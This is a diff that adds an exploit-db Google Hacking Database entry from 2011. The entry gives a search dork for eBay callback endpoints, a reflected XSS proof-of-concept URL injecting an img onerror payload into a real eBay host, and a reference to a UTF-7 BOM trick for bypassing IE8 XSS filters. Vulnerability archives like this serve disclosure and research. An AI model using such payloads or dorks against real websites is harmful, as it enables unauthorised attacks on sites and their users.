@@ -1,0 +1,9 @@
+GHDB URL:         https://www.exploit-db.com/ghdb/3685
+Category:         Advisories and Vulnerabilities
+Published Date:   2011-02-11
+Author:           anonymous
+GoogleDork:       site:ebay.com inurl:callback
+Description:      site:ebay.com inurl:callback
+
+
+Returns: http://sea.ebay.com/jplocal/campany/getcampnum.php?callback=? then: http://sea.ebay.com/jplocal/campany/getcampnum.php?callback=?xxxx%3Cimg%20src=1%20onerror=alert(1)%3E Can also use: http://seclists.org/fulldisclosure/2011/Feb/199 XSS through UTF7-BOM string injection to bypass IE8 XSS Filters
